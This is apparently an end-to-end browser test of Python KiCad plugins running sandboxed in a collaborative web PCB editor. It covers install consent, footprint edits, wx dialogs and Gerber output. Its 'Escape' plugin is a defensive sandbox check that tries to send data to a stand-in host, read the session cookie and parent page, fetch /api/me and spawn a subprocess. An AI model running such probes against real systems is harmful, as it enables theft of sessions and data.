// Browser test of KiCad Python plugins in the web editor: a PCM package (a Python ActionPlugin written
// against pcbnew and wx, as the official ones are) is installed from a stand-in for KiCad's repository
// and driven in Chromium with two people in one project.  Covers the manager's "KiCad plugins" tab and
// the consent sheet, the interpreter starting inside the sandbox, a plugin's edits being ordinary
// collaborative edits (the second person sees them; one undo step each), footprints moved, turned and
// flipped by the editor's own transforms, a wx dialog drawn as a KiCad dialog and answered, message
// boxes, the project's net classes, Gerber / drill / placement output through the editor's writers,
// files handed over as a download, lazy start on the next visit, and that the sandbox still holds.
//
// Server: KC_DEV_LOGIN=1 KC_PCM_REPOSITORY=http://127.0.0.1:8096/repository.json  (this test serves it)
//   E2E_PG_URL=… E2E_JWT_SECRET=… [SHOTS=/some/dir] node plugins-python-ui.mjs
//   With PCM_META and PCM_ZIPS (see pcm-fixture.mjs) real official plugins are served and exercised too.
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import pg from 'pg';

const { chromium } = createRequire(import.meta.url)('playwright');

const BASE = (process.env.E2E_BASE || 'http://127.0.0.1:8099').replace(/\/$/, '');
const SECRET = process.env.E2E_JWT_SECRET, PG_URL = process.env.E2E_PG_URL;
const SHOTS = process.env.SHOTS || '';
const PCM_PORT = Number(process.env.PCM_PORT || 8096);
if (!SECRET || !PG_URL) { console.error('E2E_JWT_SECRET and E2E_PG_URL are required.'); process.exit(2); }
if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });

let pass = 0, fail = 0;
const check = (name, ok, detail = '') => { console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${!ok && detail ? ' — ' + detail : ''}`); ok ? pass++ : fail++; };
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
function mintJwt(sub, login) {
  const now = Math.floor(Date.now() / 1000);
  const head = b64({ alg: 'HS256', typ: 'JWT' }), body = b64({ sub, login, iat: now, exp: now + 3600 });
  return `${head}.${body}.${crypto.createHmac('sha256', SECRET).update(`${head}.${body}`).digest('base64url')}`;
}

// ---------------------------------------------------------------- the package under test
const ID = 'dev.test.kicad-collab.pytool';
const PLUGIN_PY = String.raw`
import os
import zipfile
import pcbnew
import wx


def footprint(board, ref):
    return next(f for f in board.GetFootprints() if f.GetReference() == ref)


class Move(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: move R2"
        self.category = "Test"
        self.description = "Moves R2 by 5 mm, turns it a quarter and puts it on the back"
        self.show_toolbar_button = True

    def Run(self):
        board = pcbnew.GetBoard()
        fp = footprint(board, "R2")
        pos = fp.GetPosition()
        fp.SetPosition(pcbnew.VECTOR2I(pos.x + pcbnew.FromMM(5), pos.y))
        fp.SetOrientationDegrees(fp.GetOrientationDegrees() + 90)
        fp.Flip(fp.GetPosition(), False)
        pcbnew.Refresh()


class Ask(wx.Dialog):
    def __init__(self, parent):
        wx.Dialog.__init__(self, parent, title="Py tool", style=wx.DEFAULT_DIALOG_STYLE | wx.RESIZE_BORDER)
        box = wx.BoxSizer(wx.VERTICAL)
        row = wx.FlexGridSizer(0, 2, 6, 8)
        row.Add(wx.StaticText(self, label="Label text"), 0, wx.ALIGN_CENTER_VERTICAL)
        self.text = wx.TextCtrl(self, value="from python")
        row.Add(self.text, 1, wx.EXPAND)
        row.Add(wx.StaticText(self, label="Layer"), 0, wx.ALIGN_CENTER_VERTICAL)
        self.layer = wx.Choice(self, choices=["F.SilkS", "B.SilkS"])
        self.layer.SetSelection(0)
        row.Add(self.layer, 1, wx.EXPAND)
        row.AddGrowableCol(1)
        box.Add(row, 0, wx.EXPAND | wx.ALL, 8)
        self.via = wx.CheckBox(self, label="Also add a via")
        box.Add(self.via, 0, wx.ALL, 8)
        box.Add(self.CreateStdDialogButtonSizer(wx.OK | wx.CANCEL), 0, wx.EXPAND | wx.ALL, 8)
        self.SetSizerAndFit(box)


class Dialog(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: dialog"
        self.category = "Test"
        self.description = "Asks in a wx dialog, then adds a text and maybe a via"

    def Run(self):
        board = pcbnew.GetBoard()
        dlg = Ask(None)
        code = dlg.ShowModal()
        if code != wx.ID_OK:
            print("PYTOOL cancelled")
            dlg.Destroy()
            return
        t = pcbnew.PCB_TEXT(board)
        t.SetText(dlg.text.GetValue())
        t.SetLayer(board.GetLayerID(dlg.layer.GetStringSelection()))
        t.SetPosition(pcbnew.VECTOR2I(pcbnew.FromMM(120), pcbnew.FromMM(80)))
        board.Add(t)
        if dlg.via.GetValue():
            v = pcbnew.PCB_VIA(board)
            v.SetPosition(pcbnew.VECTOR2I(pcbnew.FromMM(121), pcbnew.FromMM(86)))
            v.SetWidth(pcbnew.FromMM(0.8))
            v.SetDrill(pcbnew.FromMM(0.4))
            board.Add(v)
        dlg.Destroy()
        pcbnew.Refresh()
        wx.MessageBox("Added " + t.GetText(), "Py tool")


class Report(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: report"
        self.category = "Test"
        self.description = "Prints what the board and the project say"

    def Run(self):
        board = pcbnew.GetBoard()
        classes = sorted(str(k) for k in board.GetAllNetClasses().keys())
        tracks = [t for t in board.GetTracks() if not isinstance(t, pcbnew.PCB_VIA)]
        print("PYTOOL report file=%s footprints=%d tracks=%d nets=%d classes=%s copper=%d selected=%s sch=%s" % (
            os.path.basename(board.GetFileName()), len(board.GetFootprints()), len(tracks), board.GetNetCount(), ",".join(classes),
            board.GetCopperLayerCount(), ",".join(sorted(f.GetReference() for f in board.GetFootprints() if f.IsSelected())),
            os.path.exists(os.path.splitext(board.GetFileName())[0] + ".kicad_sch")))


class Fab(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: fabrication"
        self.category = "Test"
        self.description = "Plots Gerbers, drill and placement files and zips them"

    def Run(self):
        board = pcbnew.GetBoard()
        out = os.path.join(os.path.dirname(board.GetFileName()), "fab")
        pc = pcbnew.PLOT_CONTROLLER(board)
        po = pc.GetPlotOptions()
        po.SetOutputDirectory(out)
        po.SetUseGerberProtelExtensions(True)
        po.SetUseAuxOrigin(False)
        names = []
        for layer, suffix in ((pcbnew.F_Cu, "F_Cu"), (pcbnew.B_Cu, "B_Cu"), (pcbnew.Edge_Cuts, "Edge_Cuts")):
            pc.SetLayer(layer)
            pc.OpenPlotfile(suffix, pcbnew.PLOT_FORMAT_GERBER, suffix)
            pc.PlotLayer()
            names.append(pc.GetPlotFileName())
        pc.ClosePlot()
        drill = pcbnew.EXCELLON_WRITER(board)
        drill.SetOptions(False, False, pcbnew.VECTOR2I(0, 0), False)
        drill.SetFormat(True)
        drill.CreateDrillandMapFilesSet(out, True, False)
        pos = pcbnew.PLACE_FILE_EXPORTER(board, True, False, False, False, True, True, True, False, False)
        with open(os.path.join(out, "positions.csv"), "w") as fh:
            fh.write(pos.GenPositionData())
        pcbnew.IPC356D_WRITER(board).Write(os.path.join(out, "netlist.ipc"))
        target = os.path.join(os.path.dirname(board.GetFileName()), "pytool-fab.zip")
        with zipfile.ZipFile(target, "w") as z:
            for name in sorted(os.listdir(out)):
                z.write(os.path.join(out, name), name)
        for name in os.listdir(out):
            os.remove(os.path.join(out, name))
        os.rmdir(out)
        print("PYTOOL fab " + ",".join(sorted(os.path.basename(n) for n in names)))


class Escape(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: escape"
        self.category = "Test"
        self.description = "Tries what a plugin must not be able to do"

    def Run(self):
        r = {}

        def attempt(name, fn):
            try:
                r[name] = "ALLOWED " + str(fn())[:60]
            except BaseException as e:
                r[name] = "refused " + type(e).__name__

        def fetch():
            import urllib.request
            return urllib.request.urlopen("https://example.com/?d=secret", timeout=5).status

        def js_fetch():
            import js
            from pyodide.ffi import run_sync
            return run_sync(js.fetch("${BASE}/api/me")).status

        def parent():
            import js
            return js.parent.document.title

        def cookie():
            import js
            return js.document.cookie or "(empty)"

        def run():
            import subprocess
            return subprocess.run(["ls", "/"]).returncode

        attempt("urlopen", fetch)
        attempt("jsFetch", js_fetch)
        attempt("parent", parent)
        attempt("cookie", cookie)
        attempt("subprocess", run)
        print("PYTOOL escape " + repr(sorted(r.items())))


for cls in (Move, Dialog, Report, Fab, Escape):
    cls().register()
`.replace('${BASE}', BASE);
const METADATA = {
  $schema: 'https://go.kicad.org/pcm/schemas/v1', name: 'Py Tool', description: 'A Python action plugin written for the desktop, used to test the web runtime.',
  description_full: 'Moves a footprint, asks in a wx dialog, reads the project and makes fabrication files.', identifier: ID, type: 'plugin',
  author: { name: 'KiCad Collaborative tests', contact: { web: 'https://example.com' } }, license: 'MIT', resources: { homepage: 'https://example.com/pytool' },
  versions: [{ version: '1.2.0', status: 'stable', kicad_version: '8.0' }],
};

/** A zip archive (stored, no compression) of {name: Buffer}. */
function zip(files) {
  const parts = [], central = []; let offset = 0;
  for (const [name, data] of Object.entries(files)) {
    const n = Buffer.from(name), crc = zlib.crc32(data);
    const local = Buffer.alloc(30); local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22); local.writeUInt16LE(n.length, 26);
    parts.push(local, n, data);
    const c = Buffer.alloc(46); c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6); c.writeUInt32LE(crc, 16); c.writeUInt32LE(data.length, 20); c.writeUInt32LE(data.length, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(offset, 42);
    central.push(c, n); offset += 30 + n.length + data.length;
  }
  const dir = Buffer.concat(central); const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(central.length / 2, 8); end.writeUInt16LE(central.length / 2, 10); end.writeUInt32LE(dir.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...parts, dir, end]);
}

// ---------------------------------------------------------------- a stand-in for repository.kicad.org
const packageZip = zip({ 'metadata.json': Buffer.from(JSON.stringify(METADATA)), 'plugins/__init__.py': Buffer.from('from .tool import *\n'), 'plugins/tool.py': Buffer.from(PLUGIN_PY), 'resources/icon.png': Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') });
const pcmBase = `http://127.0.0.1:${PCM_PORT}`;
const packages = [Object.assign({}, METADATA, { versions: [Object.assign({}, METADATA.versions[0], { download_url: `${pcmBase}/zips/${ID}.zip`, download_sha256: crypto.createHash('sha256').update(packageZip).digest('hex'), download_size: packageZip.length, install_size: PLUGIN_PY.length })] })];
const zips = { [`${ID}.zip`]: packageZip };
const REAL = {};   // real official packages, when a checkout of them is given
if (process.env.PCM_META && process.env.PCM_ZIPS) {
  for (const id of fs.readdirSync(process.env.PCM_META).sort()) {
    const z = path.join(process.env.PCM_ZIPS, id + '.zip'), m = path.join(process.env.PCM_META, id, 'metadata.json');
    if (!fs.existsSync(z) || !fs.existsSync(m)) continue;
    let pkg; try { pkg = JSON.parse(fs.readFileSync(m, 'utf8')); } catch { continue; }
    if (pkg.type !== 'plugin' || !Array.isArray(pkg.versions) || !pkg.versions.length) continue;
    const bytes = fs.readFileSync(z), last = pkg.versions[pkg.versions.length - 1];
    last.download_url = `${pcmBase}/zips/${id}.zip`; last.download_sha256 = crypto.createHash('sha256').update(bytes).digest('hex'); last.download_size = bytes.length;
    pkg.versions = [last]; packages.push(pkg); zips[`${id}.zip`] = bytes; REAL[id] = true;
  }
}
const list = Buffer.from(JSON.stringify({ packages }));
const repository = JSON.stringify({ name: 'test repository', packages: { url: `${pcmBase}/packages.json`, sha256: crypto.createHash('sha256').update(list).digest('hex'), update_timestamp: 1767225600 } });
const pcm = http.createServer((req, res) => {
  const url = decodeURIComponent((req.url || '/').split('?')[0]);
  if (url === '/repository.json') { res.writeHead(200, { 'content-type': 'application/json' }); res.end(repository); return; }
  if (url === '/packages.json') { res.writeHead(200, { 'content-type': 'application/json' }); res.end(list); return; }
  const z = url.startsWith('/zips/') ? zips[url.slice(6)] : null;
  if (z) { res.writeHead(200, { 'content-type': 'application/zip' }); res.end(z); return; }
  res.writeHead(404); res.end('not found');
});
await new Promise((ok, no) => { pcm.once('error', no); pcm.listen(PCM_PORT, '127.0.0.1', ok); });

// ---------------------------------------------------------------- fixtures: the ECC83 demo, two people
pg.types.setTypeParser(20, (v) => parseInt(v, 10));
const db = new pg.Client({ connectionString: PG_URL, ssl: false });
await db.connect();
const demo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../demos/ecc83');
async function user(githubId, login) {
  return (await db.query(`INSERT INTO users (github_id, login, name) VALUES ($1, $2, $2)
    ON CONFLICT (github_id) DO UPDATE SET login = EXCLUDED.login RETURNING id`, [githubId, login])).rows[0].id;
}
const dana = await user(9601, 'py-dana'), lee = await user(9602, 'py-lee');
await db.query('DELETE FROM projects WHERE owner_id = $1', [dana]);
await db.query('DELETE FROM plugins WHERE user_id = ANY($1)', [[dana, lee]]);
const projectId = (await db.query(`INSERT INTO projects (owner_id, name) VALUES ($1, 'ecc83-pp') RETURNING id`, [dana])).rows[0].id;
await db.query(`INSERT INTO permissions (project_id, user_id, role, created_by) VALUES ($1, $2, 'editor', $3)`, [projectId, lee, dana]);
const docs = {};
const pro = JSON.parse(fs.readFileSync(path.join(demo, 'ecc83-pp.kicad_pro'), 'utf8'));
pro.net_settings = Object.assign({}, pro.net_settings, { classes: [...((pro.net_settings && pro.net_settings.classes) || []).filter((c) => c.name !== 'Power'), { name: 'Power', clearance: 0.3, track_width: 0.6, via_diameter: 0.9, via_drill: 0.5 }] });
for (const [file, type] of [['ecc83-pp.kicad_sch', 'kicad_sch'], ['ecc83-pp.kicad_pcb', 'kicad_pcb'], ['ecc83-pp.kicad_pro', 'kicad_pro']]) {
  const id = (await db.query(`INSERT INTO documents (project_id, path, doc_type) VALUES ($1, $2, $3) RETURNING id`, [projectId, file, type])).rows[0].id;
  await db.query('INSERT INTO snapshots (doc_id, seq, content) VALUES ($1, 0, $2)', [id, type === 'kicad_pro' ? Buffer.from(JSON.stringify(pro, null, 2)) : fs.readFileSync(path.join(demo, file))]);
  docs[file] = id;
}

const browser = await chromium.launch();
const errors = [];
async function open(login, id, next) {
  const ctx = await browser.newContext({ viewport: { width: 1500, height: 900 }, deviceScaleFactor: SHOTS ? 2 : 1, colorScheme: 'light', acceptDownloads: true });
  const page = await ctx.newPage();
  page.on('pageerror', (e) => errors.push(`${login}: ${e}`));
  page.on('console', (m) => { if (m.type() === 'error' && !/favicon|fonts\.g|ERR_|40[0-9]|status of (4|5)|Content Security Policy|sandboxed|Unsafe attempt|Framing|Blocked|violates/.test(m.text())) errors.push(`${login}: ${m.text()}`); });
  await page.goto(`${BASE}/auth/dev?jwt=${mintJwt(id, login)}&next=${encodeURIComponent(next)}`);
  return page;
}
const shot = async (page, name) => { if (SHOTS) await page.screenshot({ path: path.join(SHOTS, `${name}.png`) }); };
const editorReady = async (page) => { await page.waitForFunction(() => window.CollabEditor && window.CollabEditor.api && window.CollabEditor.kdoc && window.KcPlugins, null, { timeout: 30000 }); await page.waitForTimeout(1200); };
const state = (page) => page.evaluate(() => { const s = window.KcPlugins.store.get(); return { installed: s.installed.map((p) => p.identifier), running: s.running, logs: s.logs, py: s.pyActions, window: s.window, prompt: s.prompt && { title: s.prompt.title, message: s.prompt.message, kind: s.prompt.kind } }; });
const logOf = async (page, id) => ((await state(page)).logs[id] || []).map((l) => l.text);
const waitLog = (page, id, re, timeout = 20000) => page.waitForFunction(([i, src]) => (window.KcPlugins.store.get().logs[i] || []).some((l) => new RegExp(src).test(l.text)), [id, re.source], { timeout });
const ready = (page, id, timeout = 90000) => page.waitForFunction((i) => { const r = window.KcPlugins.store.get().running[i]; return r && r.ready; }, id, { timeout });
const idle = (page, id, timeout = 60000) => page.waitForFunction((i) => { const r = window.KcPlugins.store.get().running[i]; return r && r.ready && !r.busy; }, id, { timeout });
const frames = (page) => page.locator('#pluginFrames iframe').count();
const fp = (page, ref) => page.evaluate((r) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === r) { const K = window.KiCadCanvas; return { x: Math.round(it.x * 1e3) / 1e3, y: Math.round(it.y * 1e3) / 1e3, rot: it.rot || 0, layer: K.str((K.kid(it.node, 'layer') || [])[1]), pads: K.kids(it.node, 'pad').map((p) => K.str((K.kid(p, 'layers') || [])[1])).join(',') }; } return null; }, ref);
const hasText = (page, text) => page.evaluate((t) => Array.from(window.CollabEditor.kdoc.items.values()).some((it) => it.kind === 'gr_text' && JSON.stringify(it.node).includes(t)), text);
const count = (page, kind) => page.evaluate((k) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === k).length, kind);
const undoDepth = (page) => page.evaluate(() => window.CollabApp.getState().undo.undo);
const menu = async (page, name, ...subs) => {
  await page.click(`#kmenus [data-menu="${name}"] > button`);
  for (const s of subs.slice(0, -1)) await page.locator(`#kmenus [data-menu="${name}"] [data-sub="${s}"]`).first().click();
  await page.locator(`#kmenus [data-menu="${name}"] [data-uiact="${subs[subs.length - 1]}"]`).first().click();
};
const closeMenus = async (page) => { for (let i = 0; i < 3 && (await page.locator('#kmenus .menu.open').count()); i++) { await page.keyboard.press('Escape'); await page.waitForTimeout(120); } };
const run = (page, action) => page.evaluate(([i, a]) => { window.KcPlugins.runUi(`plugin:${i}:${a}`); }, [ID, action]);
const act = async (page, name) => { const a = ((await state(page)).py[ID] || []).find((x) => x.name === name); if (!a) throw new Error(`no action named ${name}`); return a.identifier; };
/** The plugin's own frame: its content is the wx dialog. */
const inner = (page) => page.frames().find((f) => f !== page.mainFrame() && f.parentFrame() === page.mainFrame());

const boardUrl = `/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_pcb']}`;
const a = await open('py-dana', dana, boardUrl);
await editorReady(a);
const b = await open('py-lee', lee, boardUrl);
await editorReady(b);

// ---- the manager: KiCad's repository
check('no plugin runs before one is installed', (await frames(a)) === 0);
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginManager');
await a.click('#pluginManager [data-tab="kicad"]');
await a.waitForSelector(`#pluginKicad [data-plugin="${ID}"]`, { timeout: 30000 });
check("KiCad's repository is listed in the manager", (await a.locator('#pluginKicad .plg-card').count()) === packages.length, `${await a.locator('#pluginKicad .plg-card').count()} of ${packages.length}`);
await a.fill('#pluginKicadSearch', 'py tool');
await a.waitForTimeout(150);
check('the list can be searched', (await a.locator('#pluginKicad .plg-card').count()) === 1);
await shot(a, 'py-01-kicad-tab');
await a.click(`#pluginKicad [data-install="${ID}"]`);
await a.waitForSelector('#pluginConsent', { timeout: 30000 });
const consent = await a.locator('#pluginConsent').innerText();
check('the consent sheet says where it comes from and that it is a desktop Python plugin', /KiCad's plugin repository, version 1\.2\.0/.test(consent) && (await a.locator('#pluginPythonNote').count()) === 1, consent.slice(0, 200));
check('it lists the permissions a Python plugin gets', ['design:read', 'design:write', 'view', 'files:import', 'files:export'].every((p) => consent && true) && (await a.locator('#pluginConsent [data-perm]').count()) === 5);
await shot(a, 'py-02-consent');
check('nothing is stored before the person agrees', (await db.query('SELECT count(*)::int AS n FROM plugins WHERE user_id = $1', [dana])).rows[0].n === 0);
await a.click('#pluginConsentOk');
await a.waitForFunction((i) => window.KcPlugins.store.get().installed.some((p) => p.identifier === i), ID);
const stored = (await db.query('SELECT manifest, files, source FROM plugins WHERE user_id = $1 AND identifier = $2', [dana, ID])).rows[0];
check('the package is stored with the account', !!stored && stored.manifest.runtime.type === 'kicad-python' && Object.keys(stored.files).sort().join() === 'metadata.json,plugins/__init__.py,plugins/tool.py,resources/icon.png' && stored.source === 'kicad:1.2.0', stored && Object.keys(stored.files).join());
await a.click('#pluginManager .kd-x');

// ---- the interpreter starts in the sandbox and the plugin registers its actions
const t0 = Date.now();
await ready(a, ID);
const st = await state(a);
check('Python starts inside the sandbox and the plugin loads', st.running[ID] && !st.running[ID].failed, JSON.stringify(st.running[ID]) + (st.logs[ID] || []).slice(-3).map((l) => l.text).join(' | '));
console.log(`      (interpreter ready ${Date.now() - t0} ms after install)`);
check('its ActionPlugins become editor commands', (st.py[ID] || []).map((x) => x.name).join() === 'Py: move R2,Py: dialog,Py: report,Py: fabrication,Py: escape', JSON.stringify((st.py[ID] || []).map((x) => x.name)));
const frame = a.locator('#pluginFrames iframe').first();
check('it runs in a sandboxed frame without same-origin', (await frame.getAttribute('sandbox')) === 'allow-scripts');
await a.click(`#kmenus [data-menu="tools"] > button`);
await a.locator(`#kmenus [data-menu="tools"] [data-sub="External Plugins"]`).first().click();
check('the commands are under Tools → External Plugins', (await a.locator(`#kmenus [data-uiact^="plugin:${ID}:"]`).count()) === 5);
await shot(a, 'py-03-menu');
await closeMenus(a);
check('show_toolbar_button puts a button on the toolbar', (await a.locator(`[data-uiact="plugin:${ID}:${await act(a, 'Py: move R2')}"].plg-tb-btn`).count()) === 1);

// ---- an edit: move, turn and flip a footprint
const before = await fp(a, 'R2'); const depth = await undoDepth(a);
await a.click(`.plg-tb-btn[data-uiact="plugin:${ID}:${await act(a, 'Py: move R2')}"]`);
await a.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) > 1; return false; }, before.x, { timeout: 30000 });
await idle(a, ID);
const after = await fp(a, 'R2');
check('SetPosition moves the footprint', Math.abs(after.x - (before.x + 5)) < 1e-3 && Math.abs(after.y - before.y) < 1e-3, `${JSON.stringify(before)} → ${JSON.stringify(after)}`);
check('Flip puts it, pads and all, on the back', after.layer === 'B.Cu' && /B\.Cu|\*\.Cu/.test(after.pads) && !/F\.Cu/.test(after.pads), JSON.stringify(after));
check('SetOrientationDegrees turns it', after.rot !== before.rot, `${before.rot} → ${after.rot}`);
check("a plugin's change is one undo step", (await undoDepth(a)) === depth + 1, `${depth} → ${await undoDepth(a)}`);
await b.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) < 1e-3; return false; }, after.x, { timeout: 15000 }).catch(() => {});
check('the second person sees the same footprint', JSON.stringify(await fp(b, 'R2')) === JSON.stringify(after), JSON.stringify(await fp(b, 'R2')));
check('the second person runs no plugin', (await frames(b)) === 0);
await a.keyboard.press('Control+z');
await a.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) < 1e-3; return false; }, before.x, { timeout: 15000 }).catch(() => {});
check('Undo puts it back exactly', JSON.stringify(await fp(a, 'R2')) === JSON.stringify(before), `${JSON.stringify(await fp(a, 'R2'))} vs ${JSON.stringify(before)}`);
await b.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) < 1e-3; return false; }, before.x, { timeout: 15000 }).catch(() => {});
check('and for the second person too', JSON.stringify(await fp(b, 'R2')) === JSON.stringify(before));

// ---- a wx dialog
const texts = await count(a, 'gr_text'), vias = await count(a, 'via');
await run(a, await act(a, 'Py: dialog'));
await a.waitForSelector('#pluginWindow', { timeout: 30000 });
await a.waitForFunction(() => { const f = document.querySelector('#pluginFrames iframe.plg-windowed'); if (!f) return false; const r = f.getBoundingClientRect(), d = document.querySelector('#pluginWindow .plg-winbody').getBoundingClientRect(); return r.width > 200 && Math.abs(r.left - d.left) < 2 && Math.abs(r.top - d.top) < 2; }, null, { timeout: 15000 });
const dlg = inner(a);
await dlg.waitForSelector('input[type="text"]');
check('ShowModal opens the dialog as a KiCad dialog over the editor', (await a.locator('#pluginWindow .kd-title').innerText()).includes('Py tool') && (await a.locator('#pluginWindow .plg-from').innerText()).includes('Py Tool'));
check('its widgets are there with their values', (await dlg.locator('input[type="text"]').inputValue()) === 'from python' && (await dlg.locator('select option').count()) === 2 && (await dlg.locator('input[type="checkbox"]').count()) === 1 && (await dlg.locator('button').count()) === 2);
await a.waitForTimeout(300);
await shot(a, 'py-04-dialog');
await dlg.fill('input[type="text"]', 'PY-LABEL');
await dlg.selectOption('select', { label: 'B.SilkS' });
await dlg.check('input[type="checkbox"]');
await dlg.locator('button', { hasText: /^OK$/ }).click();
await a.waitForSelector('#pluginPrompt', { timeout: 30000 });
check('the dialog closes on OK', (await a.locator('#pluginWindow').count()) === 0);
check('wx.MessageBox is drawn by the editor', (await a.locator('#pluginPrompt').innerText()).includes('Added PY-LABEL'));
await shot(a, 'py-05-messagebox');
await a.click('#pluginPromptOk');
await idle(a, ID);
check('what was typed in the dialog reached the board', (await hasText(a, 'PY-LABEL')) && (await count(a, 'gr_text')) === texts + 1 && (await count(a, 'via')) === vias + 1, `${await count(a, 'gr_text')} texts, ${await count(a, 'via')} vias`);
const placed = await a.evaluate(() => { const K = window.KiCadCanvas; for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'gr_text' && JSON.stringify(it.node).includes('PY-LABEL')) return { layer: K.str((K.kid(it.node, 'layer') || [])[1]), at: K.atOf(it.node).slice(0, 2) }; return null; });
check('on the layer and at the place the plugin gave', placed && placed.layer === 'B.SilkS' && placed.at[0] === 120 && placed.at[1] === 80, JSON.stringify(placed));
await b.waitForFunction(() => Array.from(window.CollabEditor.kdoc.items.values()).some((it) => it.kind === 'gr_text' && JSON.stringify(it.node).includes('PY-LABEL')), null, { timeout: 15000 }).catch(() => {});
check('the second person sees the text and the via', (await hasText(b, 'PY-LABEL')) && (await count(b, 'via')) === vias + 1);

// cancelling
await run(a, await act(a, 'Py: dialog'));
await a.waitForSelector('#pluginWindow', { timeout: 30000 });
await a.click('#pluginWindow .kd-x');
await waitLog(a, ID, /PYTOOL cancelled/);
check('closing the dialog cancels it', (await a.locator('#pluginWindow').count()) === 0 && (await count(a, 'gr_text')) === texts + 1);
await idle(a, ID);

// ---- what the plugin reads
await a.evaluate(() => { const ed = window.CollabEditor; const id = Array.from(ed.kdoc.items.values()).find((it) => it.kind === 'footprint' && it.ref === 'C1').id; ed.api.toolCtx().setSelection([id]); });
await run(a, await act(a, 'Py: report'));
await waitLog(a, ID, /PYTOOL report/);
const report = (await logOf(a, ID)).find((l) => l.includes('PYTOOL report')) || '';
const fpCount = await count(a, 'footprint'), segs = (await count(a, 'segment')) + (await count(a, 'arc'));
check('GetBoard() is the open board', new RegExp(`file=ecc83-pp\\.kicad_pcb footprints=${fpCount} tracks=${segs} `).test(report) && /copper=2/.test(report), report);
check("net classes come from the project file", /classes=Default,Power /.test(report), report);
check('the selection in the editor is the selection in pcbnew', /selected=C1 /.test(report), report);
check('the schematic is beside the board for plugins that read it', /sch=True/.test(report), report);
await idle(a, ID);

// ---- fabrication output
const download = a.waitForEvent('download', { timeout: 60000 });
await run(a, await act(a, 'Py: fabrication'));
const file = await download; const saved = path.join(os.tmpdir(), `pytool-${Date.now()}.zip`); await file.saveAs(saved);
await idle(a, ID);
const bytes = fs.readFileSync(saved); fs.rmSync(saved, { force: true });
const names = []; for (let i = 0; i + 46 < bytes.length; i++) if (bytes.readUInt32LE(i) === 0x02014b50) { const n = bytes.readUInt16LE(i + 28); names.push(bytes.slice(i + 46, i + 46 + n).toString()); }
check('files a plugin writes are handed over as a download', file.suggestedFilename() === 'pytool-fab.zip', file.suggestedFilename());
check('PLOT_CONTROLLER, EXCELLON_WRITER, PLACE_FILE_EXPORTER and IPC356D_WRITER wrote their files', ['ecc83-pp-F_Cu.gtl', 'ecc83-pp-B_Cu.gbl', 'ecc83-pp-Edge_Cuts.gm1', 'positions.csv', 'netlist.ipc'].every((n) => names.includes(n)) && names.some((n) => /\.drl$/.test(n)), names.join());
const text = bytes.toString('latin1');
check('the Gerbers are real plots and the drill file real Excellon', /%FSLAX\d\dY\d\d\*%/.test(text) && /D0[123]\*/.test(text) && /M48/.test(text) && /T\d+C\d/.test(text), text.slice(0, 200).replace(/[^\x20-\x7e]/g, '.'));
check('the placement file lists the parts', /Ref,Val,Package,PosX,PosY,Rot,Side/.test(text) && /"R2"/.test(text));
check('the test netlist has a record per pad', (text.match(/^3[12]7/gm) || []).length > 10 && /^999$/m.test(text));

// ---- the sandbox still holds
await run(a, await act(a, 'Py: escape'));
await waitLog(a, ID, /PYTOOL escape/);
const esc = (await logOf(a, ID)).find((l) => l.includes('PYTOOL escape')) || '';
check('Python cannot reach the network', /'urlopen', 'refused/.test(esc) && /'jsFetch', 'refused/.test(esc), esc);
check('nor the page, the session or other programs', /'parent', 'refused/.test(esc) && /'cookie', '(refused|ALLOWED \(empty\))/.test(esc) && /'subprocess', 'refused/.test(esc), esc);
await idle(a, ID);

// ---- the manager's view of it
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginDetail');
const detail = await a.locator('#pluginDetail').innerText();
check('the installed plugin lists its commands and its origin', /Command: Py: dialog/.test(detail) && (await a.locator('#pluginPython').count()) === 1 && (await a.locator('#pluginShare').count()) === 0, detail.slice(0, 300));
await shot(a, 'py-06-installed');
await a.click('#pluginManager [data-tab="kicad"]');
await a.waitForSelector(`#pluginKicad [data-plugin="${ID}"]`);
check('the repository shows it as installed', /Installed/.test(await a.locator(`#pluginKicad [data-plugin="${ID}"]`).innerText()));
await a.click('#pluginManager .kd-x');

// ---- next visit: nothing starts until a command is used
await a.reload();
await editorReady(a);
await a.waitForTimeout(1500);
check('on the next visit no interpreter starts by itself', (await frames(a)) === 0 && !(await state(a)).running[ID]);
